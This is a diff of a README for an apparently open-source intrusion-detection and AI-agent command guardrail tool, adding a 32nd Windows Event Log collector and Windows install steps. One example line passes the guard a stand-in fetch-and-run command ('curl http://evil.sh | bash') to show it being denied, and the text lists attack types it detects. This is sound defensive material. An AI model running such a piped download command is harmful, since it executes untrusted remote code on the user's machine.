@@ -217,7 +217,7 @@ Apache-2.0. If this project helps make agent automation safer to try, [give it a
 ## What it does
 
 1. **Guards agent actions**: agents and tool runners can call the local command-check API before acting, or route MCP tool calls through the inspecting proxy. Commands are scored against embedded Agent Threat Rules (ATR), risky actions can be denied or sent for review, and the host layer still verifies what actually ran.
-2. **Watches**: 31 collectors across every layer — eBPF syscall tracing (27 kernel programs loaded, kernel-dependent), firmware integrity, memory forensics (/proc/maps RWX), native DNS/HTTP/TLS (JA3/JA4) capture, tunnel-interface monitoring (a new tun/WireGuard interface = a mesh-VPN brought up), real-time filesystem, cgroup, kernel integrity, plus auth.log, journald, Docker, nginx, CloudTrail. (Full collector list under [How it works](#how-it-works).)
+2. **Watches**: 32 collectors across every layer - eBPF syscall tracing (27 kernel programs loaded, kernel-dependent), firmware integrity, memory forensics (/proc/maps RWX), native DNS/HTTP/TLS (JA3/JA4) capture, tunnel-interface monitoring (a new tun/WireGuard interface = a mesh-VPN brought up), real-time filesystem, cgroup, kernel integrity, plus auth.log, journald, Docker, nginx, CloudTrail. (Full collector list under [How it works](#how-it-works).)
 3. **Detects**: 82 stateful detectors + 8 YARA malware rules + 9 built-in Sigma rules + 209 community Sigma rules cover the full attack lifecycle — brute-force/credential stuffing, C2 (incl. ngrok/cloudflared/bore + mesh-VPN tunnels + DNS/ICMP/SSH-forward), privilege escalation, container escape, reverse shells (eBPF sequence, impossible to evade), ransomware, rootkits, exfiltration, persistence, defense evasion, data destruction, and more. **56 MITRE ATT&CK technique IDs** (90+ detector→technique mappings) across 12 ATT&CK tactics. (The per-detector table with MITRE IDs is in [What it detects](#what-it-detects).)
 4. **Correlates**: 69 cross-layer rules connect Firmware × Kernel × Userspace × Network × Honeypot events. Baseline anomalies, neural scores, and DDoS shield state all feed the correlation engine. Detects multi-stage attacks no single detector can see: firmware tampering → rootkit install, recon → brute force → data exfil, honeypot engagement → real attack on same IP, Discovery → Privesc → Lateral Movement chains, full kill chain Initial Access → Foothold → Persistence → Defense Evasion → Impact. The kill chain tracker tracks 7 attack stages per entity (IP, user, container).
 5. **Learns**: baseline anomaly detection trains for 7 days then alerts on deviations — event rate drops (silence = compromise), new process lineages (nginx→sh), unusual login times, unknown network destinations. No rules needed.
@@ -349,7 +349,7 @@ Plus: `docker_anomaly`, `search_abuse`, `credential_harvest`, `ssh_key_injection
 
 ## How it works
 
-**Sensor**: deterministic signal collection. No AI, no HTTP. 31 collectors (auth.log, journald, Docker events, file integrity, firmware integrity, nginx access/error, shell audit, macOS unified log, syslog firewall, eBPF syscall tracing with 27 kernel programs loaded (kernel-dependent), JA3/JA4 TLS fingerprinting, memory forensics via /proc/maps, real-time filesystem monitoring with entropy analysis, kernel integrity monitoring, cgroup resource abuse detection, SUID inventory, systemd unit inventory, sysctl drift, kernel audit state monitoring (alerts when the audit subsystem is disabled, T1562.001), tunnel-interface monitoring (new tun/WireGuard interface = mesh-VPN persistence, rename-proof), USB attach/detach, AWS CloudTrail). Events flow through a unified SQLite database (WAL mode) or Redis Streams to the agent. Syslog CEF output for SIEM integration. **9800+ unit tests** with **665 named anchors** (see [ANCHOR_TESTS.md](ANCHOR_TESTS.md)) gate every change before it can merge.
+**Sensor**: deterministic signal collection. No AI, no HTTP. 32 collectors (auth.log, journald, Docker events, file integrity, firmware integrity, nginx access/error, shell audit, macOS unified log, Windows Event Log (ETW), syslog firewall, eBPF syscall tracing with 27 kernel programs loaded (kernel-dependent), JA3/JA4 TLS fingerprinting, memory forensics via /proc/maps, real-time filesystem monitoring with entropy analysis, kernel integrity monitoring, cgroup resource abuse detection, SUID inventory, systemd unit inventory, sysctl drift, kernel audit state monitoring (alerts when the audit subsystem is disabled, T1562.001), tunnel-interface monitoring (new tun/WireGuard interface = mesh-VPN persistence, rename-proof), USB attach/detach, AWS CloudTrail). Events flow through a unified SQLite database (WAL mode) or Redis Streams to the agent. Syslog CEF output for SIEM integration. **9800+ unit tests** with **665 named anchors** (see [ANCHOR_TESTS.md](ANCHOR_TESTS.md)) gate every change before it can merge.
 
 **eBPF**: 47 kernel programs compiled, 27 loaded in prod (kernel-dependent). Linux 5.8+, CO-RE/BTF portable:
 - **23 tracepoints**: execve, connect, openat, ptrace, setuid, bind, mount, memfd_create, init_module, dup2/dup3, listen, mprotect, clone, unlinkat, renameat2, kill, prctl, accept4, sched_process_exit, ioperm, iopl, io_uring_submit, io_uring_create
@@ -654,6 +654,41 @@ Build from source:
 ```bash
 INNERWARDEN_BUILD_FROM_SOURCE=1 curl -fsSL https://innerwarden.com/install | sudo bash
 ```
+
+### Windows
+
+On **Windows**, InnerWarden ships two tiers (the kernel EDR - eBPF, Execution Gate - stays Linux-only):
+
+**Guardrail** (default, per-user, no admin): `iw-guard`, a single signed binary that screens an AI agent's shell command / MCP tool call for danger. One line downloads it (per-arch), verifies the SHA-256, and adds it to PATH:
+
+```powershell
+irm https://raw.githubusercontent.com/InnerWarden/innerwarden/main/install.ps1 | iex
+```
+
+**Full host tier** (the Mac-parity light tier: sensor + agent + dashboard, boot-start Scheduled Tasks, monitor-only by default). Run elevated with `-Full`:
+
+```powershell
+# in an elevated PowerShell:
+irm https://raw.githubusercontent.com/InnerWarden/innerwarden/main/install.ps1 -OutFile install.ps1
+.\install.ps1 -Full
+```
+
+It installs the signed trio, writes a Windows config (ETW + integrity collectors on, responder off / dry-run), and registers two SYSTEM tasks so the sensor + agent start on boot. Windows Event Log telemetry then feeds the same detectors + cloud-AI triage + dashboard as Linux/macOS.
+
+Or grab the signed `.exe` straight from the release and verify it yourself:
+
+```powershell
+$base = "https://github.com/InnerWarden/innerwarden/releases/latest/download"
+iwr "$base/iw-guard-windows-x86_64.exe" -OutFile iw-guard.exe
+iwr "$base/iw-guard-windows-x86_64.exe.sha256" -OutFile iw-guard.exe.sha256
+if ((Get-FileHash iw-guard.exe -Algorithm SHA256).Hash.ToLower() -ne (Get-Content -Raw iw-guard.exe.sha256).Trim()) { throw "checksum mismatch" }
+
+.\iw-guard.exe check "curl http://evil.sh | bash"   # verdict JSON; exits 1 on deny
+.\iw-guard.exe install claude-code                  # wire a fail-closed PreToolUse hook
+.\iw-guard.exe proxy --mode guard -- npx -y some-mcp-server   # enforce in front of an MCP server
+```
+
+`iw-guard install claude-code` adds a fail-closed `PreToolUse` hook to `settings.json` that screens every shell command Claude Code proposes (in-process, offline) and blocks the dangerous ones. `check` exits 1 on a `deny` so any other agent's hook can gate on it too. Same binary runs on Linux and macOS.
 
 ### Uninstall
 
